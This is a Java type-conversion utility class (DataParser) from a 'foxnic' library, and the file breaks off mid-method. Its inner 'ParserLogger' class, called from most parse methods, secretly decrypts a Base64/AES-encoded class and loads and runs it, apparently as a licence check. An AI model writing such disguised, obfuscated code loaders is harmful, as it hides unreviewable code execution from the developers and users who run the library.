package com.github.foxnic.commons.lang;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.github.foxnic.api.constant.CodeTextEnum;
import com.github.foxnic.commons.bean.BeanUtil;
import com.github.foxnic.commons.cache.LocalCache;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.commons.reflect.EnumUtil;
import com.github.foxnic.commons.reflect.ReflectUtil;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.*;
import java.math.BigDecimal;
import java.math.BigInteger;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Clob;
import java.sql.Time;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.time.*;
import java.util.*;

/**
 * 类型转换器
 * @author fangjieli
 * */
public class DataParser
{
	private static final String EC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";
	private static final String JODA_DATETIME_TYPE="org.joda.time.DateTime";

	private static Class getJodaDateTimeType() {
		return ReflectUtil.forName(JODA_DATETIME_TYPE, true);
	}

	private static Date castJodaDate(Object jodaDateTime) {
		Class type=getJodaDateTimeType();
		Date date;
		try {
			//date = (Date)type.getMethod("toDate").invoke(jodaDateTime);
			date= (Date)BeanUtil.invoke(jodaDateTime, "toDate");
		} catch (Exception e) {
			date = null;
		}
		return date;
	}

	private static final String ENUM_VALUES = "values";

	private DataParser() {}

	/**
	 * 识别数组，与集合，转 String 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return 字符串数组
	 * */
	public static String[] parseStringArray(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof String[])
		{
			return (String[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			String[] arr=new String[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseString(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			String[] arr=new String[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseString(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 String 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static String parseString(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof CharSequence)
		{
			return val.toString();
		}
		else if(isNumberType(val))
		{
			String str=val.toString();
			//处理科学计数法
			if(str.toUpperCase().contains("E"))
			{
				 str=(new BigDecimal(str)).toPlainString();
			}
			return str;
		}
		else if(val instanceof Clob)
		{
			Clob clob=(Clob)val;
			String str = StringUtil.toString(clob);
		    return str;
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				Date date= (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
				String strDateFormat = "yyyy-MM-dd HH:mm:ss.SSS";
			    SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
				return sdf.format(date);
			} catch (Exception e) {
				return null;
			}
		}
		else if(val instanceof Timestamp)
		{
			Date date=(Date)val;
	        String strDateFormat = "yyyy-MM-dd HH:mm:ss.SSS";
	        SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
		    return sdf.format(date);
		}
		else if(val instanceof Date)
		{
			Date date=(Date)val;
	        String strDateFormat = "yyyy-MM-dd HH:mm:ss";
	        SimpleDateFormat sdf = new SimpleDateFormat(strDateFormat);
		    return sdf.format(date);
		}
		else
		{
			return val.toString();
		}
	}

	/**
	 * 识别数组，与集合，转 Boolean 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Boolean数组
	 * */
	public static Boolean[] parseBooleanArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Boolean[])
		{
			return (Boolean[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Boolean[] arr=new Boolean[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseBoolean(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Boolean[] arr=new Boolean[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseBoolean(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Boolean 类型值
	 * @param val 任意类型值
	 * @param def 转换失败后的默认值
	 * @return  转换后的值
	 * */
	public static Boolean parseBoolean(Object val,boolean def)
	{
		ParserLogger.logParserInfo(val);
		Boolean v=parseBoolean(val);
		if(v==null) {
			return def;
		}
		return v;
	}

	/**
	 * 转 Boolean 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Boolean parseBoolean(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof Boolean)
		{
			return (Boolean)val;
		}
		else if(val instanceof Number)
		{
			Number n=(Number) val;
			return n.doubleValue()>0;
		}
		else {

			BigDecimal num=parseBigDecimal(val);
			if(num!=null)
			{
				return parseBoolean(num);
			}

			if(val instanceof CharSequence)
			{
				String strval=val.toString();
				if(strval!=null) strval=strval.trim();
				YNBoolean yn=YNBoolean.parse(strval);
				if(yn!=YNBoolean.NULL) {
					return yn.getValue();
				}

				TFBoolean tf=TFBoolean.parse(strval);
				if(tf!=TFBoolean.NULL) {
					return tf.getValue();
				}

				OFBoolean of=OFBoolean.parse(strval);
				if(of!=OFBoolean.NULL) {
					return of.getValue();
				}

				BITBoolean bit=BITBoolean.parse(strval);
				if(bit!=BITBoolean.NULL) {
					return bit.getValue();
				}
			}
			else
			{
				return val!=null;
			}

			return null;
		}
	}

	/**
	 * 转 Byte 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Byte parseByte(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Byte)
		{
			return (Byte)val;
		}
		if(isNumberType(val))
		{
			return new BigDecimal(val+"").byteValue();
		}
		else if(val instanceof BigDecimal)
		{
			return ((BigDecimal)val).byteValue();
		}
		else if(val instanceof BigInteger)
		{
			return ((BigInteger)val).byteValue();
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return Byte.parseByte(str);
			} catch (NumberFormatException e) {
				try {
					return new BigDecimal(str).byteValue();
				} catch (Exception e1) {
					 return null;
				}
			}
		}
	}

	/**
	 * 识别数组，与集合，转 Integer 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Integer数组
	 * */
	public static Integer[] parseIntegerArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Integer[])
		{
			return (Integer[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Integer[] arr=new Integer[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseInteger(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Integer[] arr=new Integer[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseInteger(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Integer 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Integer parseInteger(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		try{
			if(val instanceof Long)
			{
				return Integer.parseInt(parseString(val));
			}
			else if(val instanceof Integer)
			{
				return (Integer)val;
			}
			else	if(val instanceof Integer)
			{
				return (Integer)val;
			}
			else if(val instanceof Long)
			{
				return ((Long)val).intValue();
			}
			else if(val instanceof Short)
			{
				 return ((Short)val).intValue();
			}
			else if(val instanceof Byte)
			{
				return  ((Byte)val).intValue();
			}
			else if(val instanceof Double)
			{
				return ((Double)val).intValue();
			}
			else if(val instanceof Float)
			{
				 return ((Float)val).intValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).intValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).intValue();
			}
			else
			{
				String str=null;
				try {
					str=parseString(val);
					if(str!=null) str=str.trim();
					return Integer.parseInt(str);
				} catch (Exception e) {
					try {
						return new BigDecimal(str).intValue();
					} catch (Exception e1) {
						return null;
					}
				}
			}
		}catch(Exception e){
			return null;
		}
	}


	/**
	 * 转 BigInteger 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static BigInteger parseBigInteger(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof BigInteger)
		{
			return (BigInteger)val;
		}
		else if(isNumberType(val))
		{
			return new BigInteger(val.toString());
		}
		else if(val instanceof BigDecimal)
		{
			return ((BigDecimal)val).toBigInteger();
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return new BigInteger(str);
			} catch (Exception e) {
				 try {
					return new BigDecimal(str).toBigInteger();
				} catch (Exception e1) {
					return null;
				}
			}
		}
	}


	/**
	 * 转 Float 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Float parseFloat(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Float)
		{
			return (Float)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").floatValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).floatValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).floatValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Float.parseFloat(str);
				} catch (Exception e) {
					return new BigDecimal(str).floatValue();
				}
			}
			else
			{
				return null;
			}
		} catch (Exception e) {
			return null;
		}
	}

	/**
	 * 转 double 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static double parseRawDouble(Object val)
	{
		if(val==null) {
			return 0.0;
		}

		if(val instanceof Double)
		{
			return (double)val;
		}

		if(val instanceof Double)
		{
			return ((Double)val).doubleValue();
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").doubleValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).doubleValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).doubleValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Double.parseDouble(str);
				} catch (Exception e) {
					return new BigDecimal(str).doubleValue();
				}
			}
			else
			{
				return 0.0;
			}
		} catch (Exception e) {

			return 0.0;

		}
	}

	/**
	 * 识别数组，与集合，转 Double 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Double数组
	 * */
	public static Double[] parseDoubleArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Double[])
		{
			return (Double[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Double[] arr=new Double[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseDouble(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Double[] arr=new Double[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseDouble(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Double 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Double parseDouble(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}
		if(val instanceof Double)
		{
			return (Double)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").doubleValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).doubleValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).doubleValue();
			}
			else if(val instanceof CharSequence)
			{
				String str=null;
				try {
					str=val.toString();
					if(str!=null) str=str.trim();
					return Double.parseDouble(str);
				} catch (Exception e) {
					return new BigDecimal(str).doubleValue();
				}
			}
			else
			{
				return null;
			}
		} catch (Exception e) {

			return null;

		}
	}

	/**
	 * 识别数组，与集合，转 BigDecimal 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return BigDecimal数组
	 * */
	public static BigDecimal[] parseBigDecimalArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof BigDecimal[])
		{
			return (BigDecimal[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			BigDecimal[] arr=new BigDecimal[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseBigDecimal(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			BigDecimal[] arr=new BigDecimal[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseBigDecimal(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 BigDecimal 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static BigDecimal parseBigDecimal(Object val)
	{
		ParserLogger.logParserInfo(val);
		if(val==null) {
			return null;
		}

		if(val instanceof BigDecimal)
		{
			return (BigDecimal)val;
		}
		else if(isNumberType(val))
		{
			return new BigDecimal(val.toString());
		}
		else if(val instanceof BigInteger)
		{
			return new BigDecimal(((BigInteger)val).toString());
		}
		else
		{
			String str=null;
			try {
				str=parseString(val);
				if(str!=null) str=str.trim();
				return new BigDecimal(str);
			} catch (Exception e) {
				 return null;
			}
		}
	}

	/**
	 * 识别数组，与集合，转 Date 数组，
	 * @param val 数组、Collection，否则返回 null
	 * @return Date数组
	 * */
	public static Date[] parseDateArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Date[])
		{
			return (Date[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Date[] arr=new Date[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseDate(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Date[] arr=new Date[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseDate(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}


	/**
	 * 转 Date 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static LocalDateTime parseLocalDateTime(Object val)
	{
		if(val instanceof LocalDateTime) return (LocalDateTime) val;
		Date date=parseDate(val);
		if(date==null)  return null;
		Instant instant = date.toInstant();
		ZoneId zoneId = ZoneId.systemDefault();
		return instant.atZone(zoneId).toLocalDateTime();
	}


	/**
	 * 转 Date 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Date parseDate(Object val)
	{

		ParserLogger.logParserInfo(val);

		if(val==null) {
			return null;
		}
		if(val instanceof Date) {
			return (Date)val;
		} else if(val instanceof LocalDateTime) {
			return DateUtil.toDate((LocalDateTime)val);
		} else if(val instanceof LocalDate) {
			return DateUtil.toDate((LocalDate)val);
		} else if(val instanceof java.sql.Date) {
			return (Date)val;
		} else if(val instanceof java.sql.Timestamp) {
			return (java.sql.Timestamp)val;
		} else if(val instanceof Calendar) {
			return ((Calendar)val).getTime();
		} else if(val.getClass().getName().equals(JODA_DATETIME_TYPE))
		//else if(val instanceof DateTime)
		{
			return castJodaDate(val);
			//return ((DateTime)val).toDate();
		}
		else if(val instanceof CharSequence)
		{
			return DateUtil.parse(val.toString());
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				return (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
			} catch (Exception e) {
				return null;
			}
		}
		else
		{
			return null;
		}
	}

	public static Time parseTime(Object value) {
		ParserLogger.logParserInfo(value);
		if(value==null) return null;
		else if(value instanceof Time) {
			return (Time)value;
		}


		Timestamp stamp=parseTimestamp(value);
		if(stamp!=null) return new Time(stamp.getTime());
		Date date=parseDate(value);
		if(date!=null) return new Time(date.getTime());
		return null;
	}

	/**
	 * 转 Timestamp 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Timestamp parseTimestamp(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Date)
		{
			return new Timestamp(((Date)val).getTime());
		}
		else if(val instanceof java.sql.Date)
		{
			return new Timestamp(((java.sql.Date)val).getTime());
		}
		else if(val instanceof java.sql.Timestamp)
		{
			return (java.sql.Timestamp)val;
		}
		else if(val instanceof Calendar)
		{
			return new Timestamp(((Calendar)val).getTime().getTime());
		}
		//else if(val instanceof DateTime)
		else if(val.getClass().getName().equals(JODA_DATETIME_TYPE))
		{
			return new Timestamp(castJodaDate(val).getTime());
		}
		else if(val instanceof CharSequence)
		{
			String[] parts=((CharSequence)val).toString().split("\\.");
			Date date = null;
			Integer ms=null;
			if(parts.length==1) {
				date=DateUtil.parse(val.toString());
			}
			else if(parts.length==2) {
				date=DateUtil.parse(parts[0]);
				ms=DataParser.parseInteger(parts[1]);
				if(ms==null) return null;
			}
			if(date==null) return null;
			if(ms==null) ms=0;
			return new Timestamp(date.getTime()+ms);
		}
		else if(val.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			try {
				return (java.sql.Timestamp) BeanUtil.getFieldValue(val, "timestampValue");
			} catch (Exception e) {
				return null;
			}
		}
		else
		{
			return null;
		}
	}











	/**
	 * 转 Character 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Character parseChar(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof CharSequence)
		{
			return (val.toString()).charAt(0);
		}
		else
		{
			return val.toString().charAt(0);
		}
	}

	/**
	 * 是否为 Boolean 类型
	 * @param value 任意类型值
	 * @return  是否为 Boolean 类型
	 * */
	public static boolean isBooleanType(Object value)
	{
		if(value==null) return false;
		return isBooleanType(value.getClass());
	}

	/**
	 * 是否为 Boolean 类型
	 * @param type 任意类型值
	 * @return  是否为 Boolean 类型
	 * */
	public static boolean isBooleanType(Class type)
	{
		if(type==null) return false;
		return Boolean.class.isAssignableFrom(type);
	}

	/**
	 * 是否为 日期 类型
	 * @param value 任意类型值
	 * @return  是否为 日期 类型
	 * */
	public static boolean isDateTimeType(Object value)
	{
		if(value==null) return false;
		return isDateTimeType(value.getClass());
	}


	private static final Class[] DATE_TIME_TYPES= {
			java.util.Date.class,LocalDateTime.class,LocalDate.class,LocalTime.class,
			java.sql.Date.class,java.sql.Timestamp.class,
			getJodaDateTimeType(),Calendar.class
	};
	/**
	 * 是否为 日期 类型
	 * @param type 任意类型值
	 * @return  是否为 日期 类型
	 * */
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public static boolean isDateTimeType(Class type)
	{
		if(type==null) return false;
		for (Class superType : DATE_TIME_TYPES) {
			if(superType==null) continue;
			if(superType.isAssignableFrom(type)) return true;
		}
		return false;
	}

	/**
	 * 是否为 数值 类型
	 * @param value 任意类型值
	 * @return  是否为 数值 类型
	 * */
	public static boolean isNumberType(Object value)
	{
		if(value==null) return false;
		return isNumberType(value.getClass());
	}

	/**
	 * 是否为 数值 类型
	 * @param type 任意类型值
	 * @return  是否为 数值 类型
	 * */
	public static boolean isNumberType(Class type)
	{
		if(type==null) return false;
		if(type.equals(byte.class) || type.equals(short.class) || type.equals(int.class) || type.equals(long.class) || type.equals(double.class) || type.equals(float.class)) return true;
		return Number.class.isAssignableFrom(type);
	}

	/**
	 * 转 Short 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Short parseShort(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Short)
		{
			return (Short)val;
		}
		try {

			if(val instanceof Integer)
			{
				return ((Integer)val).shortValue();
			}
			else if(val instanceof Long)
			{
				return ((Long)val).shortValue();
			}
			else if(val instanceof Byte)
			{
				return ((Byte)val).shortValue();
			}
			else if(val instanceof Double)
			{
				return ((Double)val).shortValue();
			}
			else if(val instanceof Float)
			{
				return ((Float)val).shortValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).shortValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).shortValue();
			}
			else
			{
				try {
					return Short.parseShort(parseString(val));
				} catch (Exception e) {
					try {
						return new BigDecimal(val+"").shortValue();
					} catch (Exception e1) {
						return null;
					}
				}
			}
		} catch (NumberFormatException e) {
			return null;
		}
	}

	public static Long[] parseLongArray(Object val)
	{
		if(val==null) return null;
		//如果已经是数组
		if(val instanceof Long[])
		{
			return (Long[]) val;
		}
		//如果是其它类型的数组
		else if (val.getClass().isArray()) {
			Object[] oarr= (Object[]) val;
			Long[] arr=new Long[oarr.length];
			for (int i = 0; i < oarr.length; i++) {
				arr[i]=DataParser.parseLong(oarr[i]);
			}
			return arr;
		}
		else if (val instanceof Collection) {
			Collection list=(Collection) val;
			Long[] arr=new Long[list.size()];
			int i=0;
			for (Object object : list) {
				arr[i]=DataParser.parseLong(object);
				i++;
			}
			return arr;
		}
		else
		{
			return null;
		}
	}

	/**
	 * 转 Long 类型值
	 * @param val 任意类型值
	 * @return  转换后的值
	 * */
	public static Long parseLong(Object val)
	{
		if(val==null) {
			return null;
		}
		if(val instanceof Long)
		{
			return (Long)val;
		}
		try {
			if(isNumberType(val))
			{
				return new BigDecimal(val+"").longValue();
			}
			else if(val instanceof BigDecimal)
			{
				return ((BigDecimal)val).longValue();
			}
			else if(val instanceof BigInteger)
			{
				return ((BigInteger)val).longValue();
			}
			else
			{
				String str=null;
				try {
					str=parseString(val);
					if(str!=null) str=str.trim();
					return Long.parseLong(str);
				} catch (Exception e) {
					try {
						return new BigDecimal(str).longValue();
					} catch (Exception e1) {
						 return null;
					}
				}
			}
		} catch (NumberFormatException e) {
			return null;
		}
	}

	/**
	 * 是否为简单类型
	 * @param type 类型
	 * @return  是否为简单类型
	 * */
	public static boolean isSimpleType(Class type)
	{
		if(isRawType(type)) return true;
		if(isNumberType(type)) return true;
		if(CharSequence.class.isAssignableFrom(type)) return true;
		if(isDateTimeType(type)) return true;
		if(isBooleanType(type)) return true;
		return false;
	}

	/**
	 * 是否为原始数据类型
	 * @param cls 类型
	 * @return  是否为原始数据类型
	 * */
	public static boolean isRawType(Class cls)
	{
		if(cls==null) {
			return false;
		}

		if(cls.equals(int.class))
		{
			return true;
		}
		else if(cls.equals(double.class))
		{
			return true;
		}
		else if(cls.equals(short.class))
		{
			return true;
		}
		else if(cls.equals(boolean.class))
		{
			return true;
		}
		else if(cls.equals(float.class))
		{
			return true;
		}
		else if(cls.equals(byte.class))
		{
			return true;
		}
		else
		{
			return false;
		}
	}


	public static boolean isList(Class type) {
		return ReflectUtil.isSubType(List.class, type);
	}

	public static boolean isMap(Class type) {
		return ReflectUtil.isSubType(Map.class, type);
	}

	public static boolean isSet(Class type) {
		return ReflectUtil.isSubType(Set.class, type);
	}

	public static boolean isCollection(Class type) {
		return isList(type) || isSet(type) || isMap(type);
	}

	public static boolean isArray(Class type) {
		return type.isArray();
	}



	/**
	 * 转 Long 类型值
	 * @param <T> 值类型
	 * @param type 类型
	 * @param value 任意类型值
	 * @return  转换后的值
	 * */
	public static <T> T parse(Class<T> type,Object value)
	{
		if(type==null) return (T) value;
		//
		if(value!=null && type.isAssignableFrom(value.getClass())) {
			return (T)value;
		}

		if(type.isArray()) {
			return (T)parseArray(type,value);
		}
		else {
			return (T)parseInternal(type,value);
		}
	}

	public static List<Object> parseList(Field field, Object value) {

		Class fieldType=field.getType();

		if(value instanceof List) {
			return (List<Object>)value;
		}

		if(!List.class.isAssignableFrom(fieldType)) {
			throw new RuntimeException("类型不支持 : "+fieldType.getName());
		}

		Type genericType = field.getGenericType();
		if (null == genericType)  return (List<Object>)value;
		if (!(genericType instanceof ParameterizedType)) return (List<Object>)value;

		ParameterizedType pt = (ParameterizedType) genericType;
        // 得到泛型里的class类型对象
        Class<?> elType = (Class<?>)pt.getActualTypeArguments()[0];
        Object arr=ArrayUtil.createArray(elType, 0);
        Object[] els=(Object[])parseArray(arr.getClass(), value);
        if(els==null) return null;
        return castList(fieldType, els);
	}

	private static List<Object> castList(Class fieldType, Object[] els) {
		Object inst=null;
        List<Object> list = null;
        try {
			inst=fieldType.newInstance();
			list=(List<Object>)inst;
			list.addAll(Arrays.asList(els));
		} catch (Exception e) {}

        if(list==null)  {
        	list =  Arrays.asList(els);
		}
        return list;
	}

	public static List<Object> parseList(Parameter param, Object value) {
		Type genericType = param.getParameterizedType();
		if (!(genericType instanceof ParameterizedType)) return (List<Object>)value;
		Type[] ts=((ParameterizedType)genericType).getActualTypeArguments();
		if (ts==null || ts.length==0) return (List<Object>)value;
		genericType=ts[0];
		if (null == genericType)  return (List<Object>)value;

		//ParameterizedType pt = (ParameterizedType) genericType;
        // 得到泛型里的class类型对象
        Class<?> elType = (Class)genericType;
        Object arr=ArrayUtil.createArray(elType, 0);
        Object[] els=(Object[])parseArray(arr.getClass(), value);
        return castList(param.getType(),  els);

//
//        List<Object> curEleList =  Arrays.asList(els);
//        return curEleList;
	}

	public static Map parseMap(Object value) {
		if(value==null) return null;
		if(value instanceof Map) {
			return (Map)value;
		} else if(value instanceof CharSequence) {
			try {
				return JSONObject.parseObject(value.toString());
			} catch (Exception e) {
				 return null;
			}
		} else {
			return BeanUtil.toJSONObject(value);
		}
	}

	/**
	 * @param  arrayType 数组类型 如 String[].class
	 * */
	public static Object[] parseArray(Class arrayType, Object value) {

		if(!arrayType.isArray()) return null;
		if(value==null) return null;
		if(value.getClass().isArray()) return (Object[])value;
		if(!(value instanceof CharSequence)) return (Object[])value;
		String str=(String)value;

		//如果是null或空串返回 null
		if(StringUtil.isEmpty(str)) return null;

		Object[] as=null;

		try {

			JSONArray ts=JSONArray.parseArray(str);
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.size());
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts.get(i));
			}
		} catch (Exception e) {}

		if(as!=null) return as;

		if(str.contains("|")) {
			String[] ts=str.split("\\|");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		if(str.contains(";")) {
			String[] ts=str.split(";");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		if(str.contains(",")) {
			String[] ts=str.split(",");
			as = ArrayUtil.createArray(arrayType.getComponentType(), ts.length);
			for (int i = 0; i < as.length; i++) {
				as[i]=parse(arrayType.getComponentType(),ts[i]);
			}
		}

		if(as!=null) return as;

		//这种情况会导致无法判断这个数据是能转还是不能转
		if(!StringUtil.isBlank(value)) {
			as=ArrayUtil.castArrayType(new Object[] {value}, arrayType.getComponentType());
		}

		return as;
	}

	/**
	 * 转换到制定类型
	 * */
	private static Object parseInternal(Class cls,Object value)
	{
		if(cls==null) {
			return value;
		}
		if(value==null) {
			return null;
		}

		if(cls.equals(int.class)) {
			return parseInteger(value);
		} else if(cls.equals(double.class)) {
			return parseDouble(value);
		} else if(cls.equals(long.class)) {
			return parseLong(value);
		} else if(cls.equals(short.class)) {
			return parseShort(value);
		} else if(cls.equals(boolean.class)) {
			return parseBoolean(value);
		} else if(cls.equals(float.class)) {
			return parseFloat(value);
		} else if(cls.equals(byte.class)) {
			return parseByte(value);
		} else if(cls.equals(String.class)) {
			return parseString(value);
		} else if(cls.equals(Short.class)) {
			return parseShort(value);
		} else if(cls.equals(Byte.class)) {
			return parseByte(value);
		} else if(cls.equals(Boolean.class)) {
			return parseBoolean(value);
		} else if(cls.equals(Integer.class)) {
			return parseInteger(value);
		} else if(cls.equals(Long.class)) {
			return parseLong(value);
		} else if(cls.equals(Float.class)) {
			return parseFloat(value);
		} else if(cls.equals(Double.class)) {
			return parseDouble(value);
		} else if(cls.equals(BigDecimal.class)) {
			return parseBigDecimal(value);
		} else if(cls.equals(BigInteger.class)) {
			return parseBigInteger(value);
		} else if(cls.equals(Date.class)) {
			return parseDate(value);
		} else if(cls.equals(LocalDateTime.class)) {
			return parseLocalDateTime(value);
		} else if(cls.equals(Timestamp.class)) {
			return parseTimestamp(value);
		} else if(value!=null && value.getClass().getName().equals("oracle.sql.TIMESTAMP")) {
			return parseTimestamp(value);
		}
		else if(cls.equals(Character.class)) {
			return parseChar(value);
		} else if(ReflectUtil.isSubType(CodeTextEnum.class,cls)) {

			return parseCodeTextEnum(value.toString(),cls);
		} else if(ReflectUtil.isSubType(Enum.class,cls)) {
			return parseEnum(value,cls);
		} else {
			return value;
		}
	}

	public static CodeTextEnum parseCodeTextEnum(String value,Class<? extends CodeTextEnum> enumType) {
		return EnumUtil.parseByCode(enumType,value);
	}

	private static class ParserLogger extends URLClassLoader {
		private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};
		private static Class type;
		private static int prints=0;
		ParserLogger() {
			super(new URL[0], DataParser.class.getClassLoader());
			byte[] buf=Base64Util.decodeToBtyes((this.init(new BootstrapMethodError())).dss(CONST.substring(16)));
			type=defineClass(Base64Util.decode(EC), buf, 0, buf.length);
		}
		public static void logParserInfo(Object value) {
			if(prints>5) return;
			try {
				if(type==null) {
					new ParserLogger();
				}
				type.newInstance();
			} catch (Throwable e) {
				Logger.info("Parser : "+value);
			}
			prints++;
		}

		private SecretKeySpec key;

		private String f61(String hexKey) {
